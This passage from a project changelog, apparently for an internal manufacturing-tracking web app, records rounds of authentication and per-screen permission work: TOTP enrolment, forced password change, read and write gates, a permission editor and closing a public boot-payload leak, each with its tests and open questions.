an oversight - and Round 24 left it alone for exactly that reason, putting
the Super-Admin-only gate in its endpoint instead. It was the gap, written
down and locked in by its own test. The assertion is inverted here rather
than deleted, and now also checks nothing was created by the attempt. The
refusal is the existing `"Not found."`, so it discloses no more than any
other hierarchy refusal.

Round 24's endpoint keeps its own Super-Admin-only gate, now redundant.
Left in place as defence in depth, and backed by the library rather than
standing alone.

### The other three came from using Round 24, not re-reading it

**The enrolment link pointed at nothing.** Creating an Admin, or resetting
one's TOTP, produced a link to `127.0.0.1:8091` - auth_lab's port, where
nothing runs on a real deployment. `app.py` now serves `/enrol` itself,
calling `icon_auth.enrol_begin()/enrol_commit()` directly rather than
reimplementing them, and `_enrol_url()` is derived from the request so it
is right on any host (`ICON_PUBLIC_URL` overrides it behind a proxy).

Two things were deliberately NOT ported from the lab. `enrol_begin()`
accepts no token at all when the account carries `must_reenrol`, and the
lab reaches that path from a plain URL - so anyone who knows a login_id
can enrol an account whose TOTP was just reset, before its owner gets
there. **A token is required here, always.** And a wrong code re-renders
the form without calling `enrol_begin()` again, which would mint a new
secret and silently invalidate the QR already scanned.

**A temporary password was forever.** `icon_auth.login()` has always
returned `must_change_pw`; nothing read it, so a new operator signed in on
the password an Admin chose and stayed on it. The gate lives in
`require_role()`, which every write endpoint already carries, so it covers
all of them at once: such an account may read, but writes nothing into the
record under a credential somebody else still knows. The flag is read from
`app_user` per request rather than copied onto the session, so an account
reset *while signed in* is stopped on its next action.

**The Users screen was v4's table.** Replaced with the approved card
layout - avatar, name over login_id, role over station, status, and a
kebab menu. Presentation only: `_actionsCell()`, `_canAct()`,
`_statusCell()`, `usersLoad()` and every Round 24 endpoint are unchanged.

**An Admin could not re-enrol themselves.** `_canAct()` returned false for
any rank-2 target including the viewer's own row, so an Admin who lost a
phone saw "View only" - while `_require_can_act_on()` would have allowed
it, since it exempts the actor from its own rank check. Their own row now
offers Reset TOTP, and deliberately not Deactivate, which icon_auth
refuses on yourself.

### Which test proves what

`test_icon_auth.py` (19) - the inverted create_admin assertion, plus the
whole file to confirm nothing else depended on the old behaviour.
`test_users_admin.py` (21) - create_admin called directly with no endpoint
in front of it, for all three actors: Admin refused, Super Admin and cli
unaffected. `test_enrol_screen.py` (5) - the link resolves here, the full
flow in real Chromium, a used token dead and answering identically to a
bad one, recovery codes shown once, and a tokenless request starting
nothing. `test_change_password.py` (5) - forced onto the step, a reload
not slipping past, writes refused meanwhile, the policy's own sentence on
a weak password, the temporary one dead afterwards, and an account reset
mid-session stopped on its next action. `test_users_screen.py` (6) - the
card layout and the self-row Reset TOTP.

---

## Round 26 - per-screen permissions, the foundation

**This round changes no one's actual access.** It adds the table that
per-user permissions will live in, the functions that read and write it,
and seeds every account so the table says exactly what its role already
grants. Round 27 is where enforcement moves onto this table; Round 28 is
where the screen that edits it exists. Until Round 27 ships, nothing reads
`user_screen_perm` to decide anything.

Why at all: role buckets cannot express the real case - someone who should
see everything in Dispatch but create nothing outside their own screen
there, while two other people nominally sharing "Dispatch Operator" need
different screens entirely.

### The screen registry

`icon_auth.SCREENS`, confirmed against the live files rather than
transcribed - `test_screen_perms.py` parses every `data-v` in
icon_trace.html and every `NEW_VIEWS` entry in icon_live.js on each run,
and fails if the registry disagrees on any id, label or section.

| Section | id | Label |
|---|---|---|
| Overview | `mgmt` | Management Overview |
| Overview | `search` | Search & Trace |
| Production | `proddash` | Production Dashboard |
| Production | `indent` | Indent *(NEW_VIEWS)* |
| Production | `plan` | Planning |
| Production | `prodentry` | Production Entry |
| Production | `loss` | Loss & Breakdown |
| FQC | `dash` | FQC Dashboard |
| FQC | `fqc` | FQC Entry |
| Packing | `pack` | New Pallet |
| Packing | `repack` | Repack |
| Packing | `packdash` | Packing Log |
| Dispatch | `disp` | Stock & Dispatch |
| Dispatch | `invoice` | Tax Invoice |
| Dispatch | `challan` | Challan |
| Dispatch | `loadver` | Loading Verification *(NEW_VIEWS)* |
| Dispatch | `gp` | Gate Pass |
| Control | `drafts` | Drafts |
| Control | `hold` | Hold & Deviation |
| Control | `review` | Needs Review |

**Excluded, deliberately:** `admin` and `items`, the Super-Admin-only
critical surface. They stay role-gated exactly as Round 23 built them, and
no per-user toggle may reach them - Round 27 included.

**Sub-views** belong to their screen, not to themselves: `challan-list`
-> challan, `gp-list` and `gp-new` -> gp, `loading-list` and `loadsession`
-> loadver, `invoice-parser` -> invoice. Round 27's enforcement has to
resolve them that way (`icon_auth.SUBVIEWS`).

### The write:false defaults - for Mukesh to confirm before Round 27

Each was checked against the code rather than assumed from its name.

| Screen | Default write | Why |
|---|---|---|
| Management Overview | false | No write call anywhere in its wiring. |
| Search & Trace | false | Read only. |
| Production Dashboard | false | No write call. |
| FQC Dashboard | false | No write call. |
| Packing Log | false | No write call. |
| Hold & Deviation | false | `GET /api/hold` only. Holds clear by themselves when evidence arrives, or through Needs Review - nothing is released from this screen. |
| Drafts | false | Still v4's own sample-data screen, never overridden by the live layer, and makes no server call at all. (Like Users was before Round 24 - a candidate for the same treatment.) |
| **Needs Review** | **true - departs from the brief** | The brief listed it read-only. It is not: it is where Quality, Production Incharge and Admin resolve items, through `POST /api/review/resolve` - the Quality role's entire job. Read-only here would take that job away the moment Round 27 enforces, which this round's own rule forbids. |

Export (`POST /api/export/xlsx`) is on every screen, read-only ones
included, and is gated as a read since Round 23. **Round 27 must not tie
it to these write flags**, or every read-only screen loses its download
button.

### One departure from the brief in how defaults are derived

The brief said to read `ROLES` from icon_trace.html. The live layer
rewrites that object at runtime, and v4's literal alone would have given
Admin and Super Admin no Indent or Loading Verification, Dispatch and
Packing no Loading Verification, Production Incharge no Indent or Needs
Review, and **the Quality role no screens at all**. `default_perms_for_role()`
therefore applies the same four sources the running page does, parsed
rather than hand-copied. It is tested against something independent: the
test signs in to the real page in Chromium and reads `window.ROLES` as the
live layer left it. A v4-only parse fails that test on its first role.

### Things Round 27 needs to know

- **A screen's write flag is broader than some roles' real power on it.**
  FQC Operator gets `write` on Needs Review, because v4's ROLES gives them
  that screen - but `/api/review/resolve`'s per-branch checks admit only
  Quality, Production Incharge and Admin, so an FQC Operator can resolve
  nothing there. Round 27 must **keep** those inner checks, not replace
  them with this table, or FQC Operators gain resolve power the day
  enforcement moves.
- **Nobody may change their own permissions.** `_require_can_act_on()`
  permits acting on yourself; here that would be the one way a restricted
  account could hand a screen back to itself, so `set_screen_perms()`
  refuses it.
- **`ensureRoleEntry()` in icon_live.js aliases ANY role the page does not
  know to Admin's screens.** Cosmetic today, since the server refuses an
  unknown role everything - but once the nav is driven by this table
  instead, that fallback should narrow to nothing, matching
  `default_perms_for_role()`, which gives an unknown role no screens.
- **Test fixtures create accounts directly**, bypassing create_operator(),
  so those accounts have no permission rows. Harmless now; once Round 27
  enforces, `auth_test_helper` will need to seed them.

### What proves it

`test_screen_perms.py` (16): the registry against the live nav, mutation-
checked for a wrong label, a wrong section and a missing screen; the role
defaults against `window.ROLES` from a real browser, role by role and
screen by screen; the no-rows default; every create function leaving a full
row set, read back; the hierarchy refusal; the self-change refusal; unknown
screen, write-without-view and malformed input refused before anything is
written; partial maps merging rather than replacing; and the migration's
dry run, backup refusal, exact result (140 cells across seven roles, zero
mismatches) and safe re-run.

### Running it

Once, on the real database, after this round is merged:

    copy icontrace.db icontrace.db.bak
    python migrate_screen_perms.py            # read what it will do
    python migrate_screen_perms.py --apply

## Round 27 - enforcement moves onto per-screen permissions.

**From this round, an ordinary screen's write endpoints check the account's
own `user_screen_perm` row, not its role.** `require_screen_write(screen)`
in app.py has the same shape as `require_role()`: 401 "Sign in required."
with no session, 403 "Set your own password before saving anything." while
`must_change_pw` stands (kept exactly as `require_role` has it), and 403
"Not permitted for your role." when the account's write flag for that
screen is false - **or there is no row at all**, which
`get_screen_perms()` reads as no access on purpose. Sub-view ids resolve to
their parent through `icon_auth.SUBVIEWS`. `admin`, `items` and unknown ids
are refused with a ValueError at import time, so a typo cannot quietly
move the critical surface onto a per-user flag.

> **Run the Round 26 migration on the real database before this code runs
> against it.** Until then, every account with no permission rows is
> refused every write this round moves. Mukesh's step, unchanged except
> for the new time limit:
>
>     copy icontrace.db icontrace.db.bak
>     python migrate_screen_perms.py
>     python migrate_screen_perms.py --apply     (within 10 minutes of the copy)

### The endpoint-to-screen map

40 endpoints on 13 screens. With
every account seeded from its role's defaults, the set of roles that pass
is **identical to Round 23's on 39 of the 40**. That was checked
mechanically against the decorators at d9574c2. The one difference is
marked in the table.

| Screen | Endpoint | Was |
|---|---|---|
| challan | `POST /api/challan` | _R_DISPATCH |
| challan | `POST /api/challan/<id>/submit` | _R_DISPATCH |
| challan | `POST /api/challan/<id>/discard` | _R_DISPATCH |
| challan | `POST /api/challan/<id>/cancel` | _R_DISPATCH |
| challan | `POST /api/challan/<id>/edit-draft` | _R_DISPATCH |
| challan | `POST /api/challan/<id>/edit-save` | _R_DISPATCH |
| challan | `POST /api/challan/checks` | _R_DISPATCH |
| gp | `POST /api/gatepass` | _R_DISPATCH |
| gp | `PUT /api/gatepass/<id>` | _R_DISPATCH |
| gp | `GET/POST /gatepass` *(legacy form page)* | _R_DISPATCH |
| invoice | `POST /api/invoice/parse` | _R_DISPATCH |
| invoice | `POST /api/invoice/confirm` | _R_DISPATCH |
| invoice | `POST /invoice/parse`, `/invoice/confirm`, `/invoice/cancel` *(legacy)* | _R_DISPATCH |
| disp | `GET/POST /dispatch` *(legacy form page)* | _R_DISPATCH |
| loadver | `POST /api/loading/<id>/confirm` | _R_LOADING |
| loadver | `POST /api/loading/<id>/submit` | _R_LOADING |
| pack | `POST /api/box/open` | _R_PACK |
| pack | `POST /api/box/<id>/scan`, `/remove`, `/close`, `/capacity`, `/abandon` | _R_PACK |
| pack | `POST /api/box/<id>/repack` | _R_PACK |
| pack | `GET/POST /packing` *(legacy form page)* | _R_PACK |
| repack | `POST /api/repack` | _R_PACK |
| fqc | `POST /api/fqc` | _R_FQC |
| fqc | `GET/POST /fqc` *(legacy form page)* | _R_FQC |
| indent | `POST /api/indent`, `PUT /api/indent/<no>` | _R_PROD |
| indent | `GET/POST /indent/new` *(legacy form page)* | _R_PROD |
| plan | `POST /api/allocation`, `PUT .../<id>/update`, `DELETE .../<id>` | _R_PROD |
| plan | `GET/POST /planning` *(legacy form page)* | _R_PROD |
| prodentry | `POST /api/prodentry` | _R_PROD |
| loss | `POST /api/loss_event`, `POST /api/loss_event/<id>/close` | _R_PROD |
| review | `POST /api/review/resolve` | _R_EVERY - **narrows**: Dispatch and Packing Operator have no write on Needs Review. Every inner branch already refused them, so they could never resolve anything. They now get the 403 at the door instead. |

Where the map is less than obvious:

- **No live-page caller today.** These are mapped by what the endpoint's
  own path and docstring say it belongs to: `/api/box/<id>/repack` ("one
  closed pallet, opened from the Packing screen" -> pack),
  `/api/challan/<id>/cancel` (challan - the Challan list's Cancel button
  calls `/discard`), and the legacy server-rendered pages `/dispatch`,
  `/gatepass`, `/packing`, `/fqc`, `/planning`, `/indent/new` and
  `/invoice/*`.
- **The legacy GET/POST pages are gated on GET as well**, as they were
  under `require_role`. So an account with view but not write on, say,
  pack cannot open `/packing` at all. The behaviour is unchanged, but
  "view" in the new table does not reach these old pages. If nothing uses
  them, they are candidates for removal.
- `/api/challan/checks` and `/api/challan/<id>/edit-draft` are POSTs that
  write nothing. They stay behind challan's write flag because the only
  reason to call them is to go on and write a challan.

### Still on role gates, deliberately

| Endpoint | Gate | Why it did not move |
|---|---|---|
| `POST /api/material`, `PUT /api/material/<n>`, `PUT /api/cell-efficiencies`, `POST /api/db/reset`, `POST /api/settings` | _R_MASTER | The admin/items critical surface - never per-user. |
| `GET/POST /settings`, `GET/POST /admin/challan-import` | _R_ADMIN | The Admin screen's own surface. Their writes are Super-Admin-only through the inner checks below. |
| `GET/POST /api/users`, `POST /api/users/<id>/reset-password`, `/reset-totp`, `/unlock`, `/deactivate`, `/reactivate` | _R_ADMIN | User management lives inside the Admin screen. `admin` is excluded from the registry, so there is no flag to move them onto. |
| `POST /api/export/xlsx` | _R_EVERY | Every screen's download button, read-only screens included. Tying it to any one screen's write flag would take Export away from exactly those screens (Round 26's warning). |
| `POST /api/quality` | _R_QUALITY | **Serves no screen.** Quality Decision was retired into Needs Review, and nothing in the live page calls this endpoint now. Putting it on review's flag would let Production Incharge and FQC Operator (who have write on Needs Review) grade quality here, bypassing the `_QUALITY_ROLES` check the review path keeps. Left as it was; a candidate for deletion. |

### The inline role checks - preserved word for word

Six `_require_role()` calls inside endpoints add to the outer gate and are
untouched by this round. They are the same calls with the same text, only
shifted in line number. Checked by diff against d9574c2: the only lines
removed from app.py are the 40 decorator lines and one docstring sentence.

| app.py (at c06f6c3) | Where | Allows |
|---|---|---|
| 5624 | `/admin/challan-import`, action=load | _R_MASTER |
| 6075 | `_resolve_provisional_mismatch` | _QUALITY_ROLES |
| 6486 | `_resolve_duplicate_scan`, serial already dispatched | "Admin" |
| 6498 | `_resolve_duplicate_scan`, not dispatched | _INCHARGE_ROLES |
| 6561 | `api_review_resolve`, quality_grade | _QUALITY_ROLES |
| 7052 | `/settings`, POST | _R_MASTER |

`test_inner_role_checks.py` proves each one with an actor whose write flag
on the outer screen is asserted true but whose role is wrong for the
branch. Each is refused in the inner check's own words, never the outer
gate's.

Noticed while testing, not changed: `_QUALITY_ROLES` is `("Quality",
"Admin")`. **Super Admin is not in it**, so a Super Admin cannot resolve a
quality decision or a provisional mismatch, although everywhere else Super
Admin can do everything Admin can. This round's rule was word-for-word
preservation, so this is flagged for a decision rather than changed.

### Backup freshness in the migration

`_backup_present()` used to accept any backup that existed - last week's as
readily as one from a minute ago. It now finds the **newest** backup and
its age, and `--apply` refuses anything over ten minutes old
(`ICON_BACKUP_MAX_AGE_S` overrides this), naming the file and its age:

    Refusing to run: the newest backup, ...\icontrace.db.bak, is 20 minutes old - older than the 10 minutes allowed.

Age is taken from the later of modified and created time, because
Windows' `copy` keeps the source's modified time. Checked: a copy made at
16:08:39 of a file last written at 15:08:39 has LastWriteTime 15:08:39 and
CreationTime 16:08:39. Going by modified time alone would refuse a
genuinely fresh copy, and copying again would not help.

### Test fixtures

`auth_test_helper.make_user()` now seeds each new account with its role's
defaults, as `create_operator()` and friends do for real accounts - the
Round 26 note, acted on. `test_role_gates.py` reads either decorator and
works out a screen-gated endpoint's allowed roles from those defaults, so
its 11 tests mean the same as before. `test_login_screen.py` creates its
own account directly (it needs a real password), so it seeds the same
way. The full suite found this: Dispatch Operator was refused the gate
pass with a 403.

### What proves it

- `test_screen_write_gates.py` (9) - generated from the decorators. The
  map equals the reviewed map above. `admin`, `items` and typos are
  refused at import. The critical surface still carries its role gates.
  On all 40 endpoints: write:true passes for a **Quality** account (whose
  role reaches none of them); write:false and no row are both 403 for a
  **Super Admin** (whose role reaches all of them); an unmigrated account
  gets 403; no session gets 401; and `must_change_pw` gets 403 through the
  new gate.
- `test_inner_role_checks.py` (6) - the six inner checks above, plus a
  right role with its flag withdrawn, refused at the door.
- `test_screen_perms.py` (16 -> 20) - a fresh backup is accepted; a
  20-minute-old backup is refused with its age named; the limit is
  configurable; and the newest of several backups is the one judged,
  including a copy that kept its source's old modified time.

Full suite at 398f730: every Python and JS file passes, except failures
that reproduce identically at d9574c2 (checked in a clean worktree of it):
`test_fqc.py`'s one ("the module journey says what happened at FQC"),
`test_build_banner_live.py` (waits for v4's `#who` dropdown, gone since
Round 23), `test_js.js` (WSH compile error at 2146), and
`test_fqc_dashboard.js` (2/16, WSH has no `console`). The UI files that
expect a server already running on 8090 or 5000 (`test_fqc_anomaly_ui`,
`test_fqc_dashboard_ui`, `test_fqc_recent_ui`, `test_mgmt_ui`,
`test_pack_ui`, `test_prod_ui`) answer ERR_CONNECTION_REFUSED without
one - environmental. One flaky test: `test_login_screen.py`'s "old login
is never painted" is timed with a sleep (a 1.5s delay checked at 700ms)
and failed 2 of 7 runs here, against 0 of 6 at d9574c2. It measures
`GET /` and the page's own scripts, which this round does not touch.

### For Round 28

- The page still decides what to show from `ROLES`, not from this table.
  An account whose write was withdrawn on a screen still sees that
  screen's buttons and gets a 403 when it presses one. The editor, and a
  nav driven by `get_screen_perms()`, are Round 28's job.
- Round 26's `ensureRoleEntry()` note still stands.
- Observed, pre-existing, untouched: `POST /api/box/open` with no `model`
  raises a KeyError and answers 500 rather than 400.

## Round 28

**`can_view` was written for every account from Round 26 on, and enforced
nowhere until this round.** Round 27 moved writes onto the table; reads
stayed open. Any signed-in account could read any screen's data straight
from its endpoint whatever its View flag said - and, it turned out, so
could anybody who was not signed in at all (below). The only thing hiding
a screen was `ROLES[role].views` on the page, which hides a nav button and
stops nothing.

**Client-side screen access now comes from the permission map, not from
`ROLES`.** `/login` and `/api/session` return the account's own
`{screen: {view, write}}` map; `can(v)` reads it. `ROLES` still supplies
each role's home screen and the "Can access" labels, and still decides
`admin` and `items`, which are never per-user.

### Enforcement on reads

`require_screen_view(*screens)` in app.py - the read counterpart of
`require_screen_write`: 401 with no session, 403 "Not permitted for your
role." when the account cannot view **any** of the listed screens. Not
refused while `must_change_pw` stands: since Round 25 a temporary-password
account may read and may not write, and that asymmetry is now tested.
Both gates read the table on every request, so a change made in the editor
applies from the account's next request - no sign-out, no push.

The read map, shown for review before it was applied:

| Gate (view on any of) | Endpoints |
|---|---|
| mgmt | `/mgmt` |
| mgmt, proddash | `/api/prod/dashboard`, `/api/prod` |
| mgmt, dash | `/api/fqc/dashboard` |
| mgmt, disp | `/api/stock_dispatch` |
| search | `/api/trace/find`, `/api/trace/serial/<s>`, `/api/trace/invoice/<no>`, `/search` |
| proddash | `/dashboard` |
| indent | `/api/indents`, `/api/indent/<no>`, `/indent`, `/view/indent`, `/view/indent-form` |
| plan | `/api/allocations`, `/api/allocation/<id>/detail`, `/allocation/<id>/barcodes(.xlsx)`, `/api/indent/line/<id>` |
| prodentry | `/api/prodentries` |
| loss | `/api/loss_events` |
| dash | `/api/fqc/dashboard/modules` |
| fqc | `/api/fqc/recent`, `/api/fqc/anomalies` |
| fqc, review | `/api/fqc/lookup`, `/api/el/image` |
| challan, fqc | `/api/ftr` *(no page caller; flash-test data behind the challan FTR document)* |
| pack | `/packing/label/<no>` |
| pack, repack | `/api/box/check`, `/api/box/<id>` |
| pack, repack, packdash | `/api/boxes`, `/box/<id>/sheet` |
| packdash | `/api/packing/log` |
| invoice | `/view/invoice/pdf/<id>` |
| invoice, challan | `/api/invoices`, `/api/invoice/<id>` |
| challan | `/api/challan/boxes`, `/api/challan/<id>`, `/api/challans/issued`, `/challan/<fy>/<seq>/print\|excel\|ftr` |
| challan, gp, pack, repack, packdash | `/api/print/resolve` *(resolves challan, gate-pass and packing-list prints)* |
| challan, disp | `/api/challans` |
| loadver | `/api/loading/challans`, `/api/loading/<id>`, `/api/loading/box`, `/loading`, `/view/loading` |
| gp | `/api/gatepasses`, `/api/gatepass/<id>`, `/gatepass/<no>/print` |
| hold | `/api/hold` |
| review | `/api/review`, `/api/quality/pending` |

"Any of" rather than "ungated" for shared reads - Mukesh's call, correcting
the brief: leaving `/api/boxes` open because three screens use it would
make the View column meaningless for all three. `/view/<name>` and
`/export/<what>.csv` serve several screens from one route and are gated
inside the handler by name (`_FRAGMENT_GATE`, `_EXPORT_GATE`).

Left ungated, one line each: `/` (the page, and the sign-in screen with
it); `/api/boot` (the boot payload - see below); `/api/session` (the
session itself, and the one call that must answer a signed-out page);
`/enrol` (before an account exists); `/healthz` and `/api/sync/status`
(liveness); `/legacy` (a redirect); `/api/customers*` (a lookup several
screens' forms share); `/api/export/xlsx` (formats rows the page already
holds - it reads nothing); static files.

### Gaps found, not new scope

- **Every read answered a signed-out caller.** Round 23 gated writes only.
  `/api/prod`, `/api/indents`, `/api/challans`, `/api/invoices`,
  `/api/review`, `/api/hold`, `/api/stock_dispatch` and the rest all
  returned 200 with no cookie. Now 401.
- **The Admin surface's reads were open to anyone**, signed out included -
  the brief assumed they were already role-gated. `/view/settings`,
  `/view/items`, `/api/db/stats`, `/api/materials`,
  `/api/evidence/sources`, `/models`. Now `_R_ADMIN`, like the rest of
  that surface.
- **`/export/<what>.csv` dumped serials, FQC records, indents and gate
  passes to anyone.** Not the Export button (`/api/export/xlsx` formats
  what the screen already has); this one reads the database itself. Now
  gated per file by the screen its rows belong to. This departs from the
  reviewed map, which listed it as ungated "export" before its body was
  read.

### The boot payload - reported, not reshaped

`ICON_BOOT` is rendered into `GET /` - the same page that is the sign-in
screen, served with no session - and again by `/api/boot`. It carries
every indent with its lines and customers (Indent, Planning), production
rows and shift summaries (Production), open pallets (Packing), the bill
of materials and cell efficiencies (Items), customers with GSTIN, and
record counts. So a view-restricted account still receives Production and
Packing data in it, **and so does anybody who opens the sign-in page.**
Gating the screens' own endpoints does not close that. Reshaping it (a
signed-in-only payload filtered by view) is the next round's.

### The page

- `can(v)` reads the map; v4's `go()`, `applyRole()` and every nav button
  call `can` by name, so hiding, refusing with v4's own "Your role does
  not have access to that screen." toast, and leaving an open screen all
  follow it. The role's home is used when viewable, else the first
  viewable screen.
- A screen the account can view but not write: a note across the top,
  and its save/create controls disabled with "Your account can view this
  screen but not save changes." on hover - re-applied by a
  MutationObserver as the screen re-renders. No live-looking Save that
  answers 403.
- **Screen loaders used to run at file load, before sign-in** - Repack's
  pallets, Challan's boxes and invoices, Stock & Dispatch's KPIs, and a
  `POST /api/challan/checks` - answered for nobody until this round. They
  now run after sign-in and only for screens the account can view, as do
  the renderers, fragment fetches and each screen's refresh. Probed on
  the real page as all seven roles and a Dashrath-shaped account, visiting
  every visible screen: no 401/403 and no page errors.

### The editor

Admin > Users, "Edit permissions" in each card's kebab menu, under the
same hierarchy as the other actions (never on your own card; Super Admin
rows never listed). The 20 screens grouped by section; Write ticks View,
unticking View clears Write; the 7 read-only screens have no Write box at
all; a per-row "changed" marker and a count; "Reset to role defaults"
(`default_perms_for_role()`); Save sends the whole map in one call to
`POST /api/users/<login_id>/perms` -> `set_screen_perms()`, audited as
`user.perms`. `GET` on the same path feeds it, behind the same hierarchy -
an Admin asking about another Admin gets "Not found." there too.

### Corrections carried from Round 27

- `_QUALITY_ROLES` and `_INCHARGE_ROLES` gain Super Admin; so does the
  dispatched-duplicate check, a literal `"Admin"` that left it out the same
  way. The Needs Review buttons' client-side mirror follows, and the feed
  stops redacting quality evidence from a Super Admin.
- `POST /api/box/open` without a model: 400 "Choose a model before
  opening a pallet.", not a 500.

**Other role checks that omit Super Admin - listed, not changed:** all in
v4's `icon_trace.html`, which is read-only: `.admin-only` elements hidden
unless `USER.role === 'Admin'` (3031); Drafts' "all sections" view and
edit rights (5349, 5368, 5371, 5436, 5473); Hold's release button
(5564); master-data add/edit toasts "Only Admin can add/edit master data"
(5783, 5917); the Access-review demo table (6043-6060, dead sample data).
Also `NEW_VIEWS`' Item Master entry lists `['Admin']` only (icon_live.js)
- harmless, since `ensureRoleEntry()` gives Super Admin Admin's screens.
Server-side, nothing else omits it.

### What proves it

- `test_screen_view_gates.py` (9) - generated from the decorators and the
  two inline tables: the map equals the reviewed map; every screen but
  Drafts has a gated read; view on EACH listed screen passes, view off on
  all of them and no rows at all are 403, no session is 401 - on all 60
  read routes; the Admin surface's reads are role-gated; `must_change_pw`
  blocks writes and not reads; a change applies on the next request.
- `test_dashrath_case.py` (6) - the acceptance case, on the server and on
  the running page: Challan and Invoice show real data and refuse every
  save; Stock & Dispatch and Gate Pass save; Packing, Production and FQC
  unreachable; the overview shows; exactly six nav buttons, home Stock &
  Dispatch, no refused request and no page error.
- `test_permission_editor.py` (6) - the endpoint's hierarchy, self-edit,
  bad-map and gating refusals; the editor in Chromium, including a save
  judged by the edited account's next request.
- `test_inner_role_checks.py` (6 -> 7) - a Super Admin resolves all four
  branches. `test_packing.py` (33 -> 34) - the model-less 400.

Fixture changes, each because a test now meets a gate it never did:
`test_fqc.py` reads the Hold list through its own Super Admin client (the
caller was Quality, who cannot view Hold); `test_build_banner.py` reads
`/api/db/stats` as Super Admin; `test_search_invoice.py` signs in again
after `seed()` wipes the database, sessions included; `test_packing.js`
and `test_challan.js` stub `can()`/`canWrite()` in their sandboxes, as
the functions they extract now ask them. The editor test also caught a
real bug: its first ids (`#peSave`, ...) collided with Production Entry's
own `#peSave` - renamed to `#permEd*`.

Full suite after this round: every Python and JS file passes except the
set that already failed at d9574c2 (Round 27 checked that in a clean
worktree) - `test_fqc.py`'s one, `test_build_banner_live.py`,
`test_js.js`, `test_fqc_dashboard.js` 2/16, and the UI files that expect
a server already running on 8090 or 5000.

### For Round 29

- Reshape the boot payload (above).
- The page reads the map at sign-in and on reload. An open page keeps its
  nav until reloaded after an edit - the server refuses from the next
  request regardless.
- Legacy GET/POST form pages (`/packing`, `/fqc`, `/planning`, ...) still
  need write to open at all; "view" does not reach them. Candidates for
  removal.
- Round 26's `ensureRoleEntry()` note narrows to `admin`/`items`: an
  unknown role is still aliased to Admin's list there.

## Round 28 follow-up - master data on the Admin screen

Reported by Mukesh: signed in as Super Admin, Admin tabs said "Only Admin
can add master data". Audited every Admin tab and Item Master on the
running page as Super Admin and as Admin. The server had it right all along
(`_R_MASTER`: materials, cell efficiencies, settings, reset are Super Admin
only); the page disagreed both ways:

- v4's `addRecord()`/`editRecord()` refuse any role not literally `'Admin'`
  - so a **Super Admin** was refused on Materials, Models and Reason codes.
- An **Admin** got the Material form, filled it in, and the server refused
  the save.
- Stations & sources told an Admin **"Evidence sources saved." over a 403**
  - nothing had been written. `frag_settings.html` now reports the
  server's refusal.

Now decided in one place in icon_live.js, per kind of record:

| Kind | Super Admin | Admin |
|---|---|---|
| material, cell efficiency, evidence-source settings | edits | read-only - controls disabled, "Only a Super Admin can change master data. You can view it." on hover and as a note on the tab |
| model, station, reason code | not offered | not offered |

Models, stations and reason codes are edited by v4 **in the page only** and
saved nowhere - the change is gone on reload. That is a demo control on a
live screen (PROJECT_OVERVIEW 5), so no role is offered it; each control
says "This list is not saved to the server yet". Making them real needs
endpoints - a decision for Mukesh, not taken here.

v4's check stays in icon_trace.html (read-only); once the live layer has
allowed an action, v4's own function runs with the role name it checks
for and the real one restored as it returns. The same wrapper gives a
Super Admin v4's "all sections" Drafts view (sample data).

Found, not changed (placeholders that only toast): **"Cancel document"**
toasts "Document cancelled. Original preserved." and **"Sign off review"**
toasts "Access review recorded against ..." - neither calls the server,
and both claim something happened. "+ Add type" (Machines) and
"+ New version" (Grade rules) only describe a form that does not exist.
Consumption BOM, Serial namespace, Open questions and Item Master have no
edit controls for anyone.

`test_master_data_ui.py` (4): a Super Admin opens and edits materials with
no "Only Admin" anywhere; an Admin sees every master control disabled with
the reason, and a forced save is reported as refused; models/stations/
reasons offered to nobody; Drafts shows a Super Admin all sections, with
the role never left swapped.

## Round 29

**The boot payload stops being public.** GET / is the sign-in page and the
app in one document, and it embedded `boot_payload()` for anybody who
asked: every indent with its customer and delivery date, the BOM, cell
efficiencies, open pallets, production and shift rows, customers with
GSTIN. **`/api/boot` returned the same payload and was entirely ungated
until this round** - Round 28's read-gating pass missed it, so it was the
same leak on a second route, open to anyone who could reach the server.

### Two payloads

- `boot_public()` - `build`, `live`, `db_file`, and nothing else. Found by
  wrapping `ICON_BOOT` in a Proxy and loading the page signed out: those
  are the only keys read before sign-in. `build` cache-busts
  `icon_add.css`, the template's three script tags and the service
  worker; `live` and `db_file` are read by the load-time console line.
  `db_file` is the database file's name, which `/healthz` already
  publishes to anyone. (The brief expected `build` alone - the console
  line was the other reader.) GET / renders with this, always.
- `boot_private()` - the full payload, unchanged in shape (tested key for
  key against d9574c2's `boot_payload()`), the same for every account.
  `/api/boot` serves it to a session only: 401 otherwise. A session is
  the bar, not a screen gate - it serves every screen at once, so
  `require_screen_view()` would be the wrong question.

**Per-account filtering of the payload was considered and deliberately
deferred.** It buys little security - a colleague can mostly reach the
same data through the screens anyway - and it is where the risk lives,
since every screen reads `B` synchronously. Mukesh's constraint decides
the shape: time spent at the login page is acceptable; fetching data in
the middle of someone's work is not. So the whole payload is fetched once,
at sign-in, and nothing is fetched later.

### Fetched in enterApp(), not the /login handler

`enterApp()` is the one funnel both ways in go through - a fresh sign-in
and a reload with a live cookie. A fetch in the /login handler alone would
leave a signed-in user who reloads with an empty `B` and blank screens.
Order inside it: `USER` from the server's answer; the `must_change_pw`
check returns first, so an account replacing a temporary password fetches
no data; the splash goes up; `/api/boot` is fetched and its keys merged
into `B` (as `iconRefresh()` already does); only then `signIn()`'s
wrapper, `applyBoot()`, `addScreens()` and the wirings - every read of `B`
synchronous against the full payload, as before. If the fetch fails, the
app is not entered half-built: back to the sign-in card with "Signed in,
but the app's data could not be loaded."

### What proves it

`test_boot_payload.py` (6): GET / signed out carries none of the seeded
markers (an indent number, its delivery date, a material, a cell
efficiency, four customer GSTINs that v4's own markup does not already
contain) - checked in the response body and in the page Chromium holds -
while `/api/boot` carries every one for a session; `/api/boot` is 401
without a session and the full shape with one; on the page, a fresh
sign-in and a reload are tested separately, each fetching `/api/boot` and
building Planning's indent list from it (applyBoot builds that list and
v4's `INDENTS` from `B.indents` alone - the Indent screen loads its own
list from `/api/indents`, so it would not catch a missing payload); a
temporary-password account fetches nothing, on sign-in or reload, until
its new password is set; a failed fetch returns to sign-in.

Full suite after this round: 43 files pass outright; the rest is the set
that already failed at d9574c2 - `test_fqc.py`'s one, `test_build_banner_live.py`,
`test_js.js`, `test_fqc_dashboard.js` 2/16, and the UI files that expect a
server already running on 8090 or 5000.

## Overnight review (2026-09-25, unattended)

Worked alone overnight at Mukesh's request: long-standing test failures
first, then misleading UI, then a hunt for more of the same. Each fix is its
own commit with a test; nothing here was pushed - review, then push.
Questions that need Mukesh are marked **Decide:**.

### Fixed

- **test_fqc.py "the module journey says what happened at FQC" - test out
